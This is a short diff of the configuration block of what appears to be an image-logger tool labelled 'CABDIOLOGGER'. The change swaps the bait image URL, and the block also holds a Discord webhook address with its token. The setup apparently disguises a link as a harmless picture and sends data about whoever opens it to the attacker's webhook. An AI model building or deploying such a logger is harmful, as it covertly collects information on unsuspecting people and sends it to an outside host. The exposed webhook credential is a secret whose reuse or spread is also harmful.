@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1493603412342734969/j5BNetZ9B8_vYMRX5Kb-nZkPShRnTauG9bfPNVjYcjZXYT1IeZ00RgGteE6n9rD8oNCl",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "image": "https://c.tenor.com/grh1asJHzg4AAAAC/tenor.gif", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
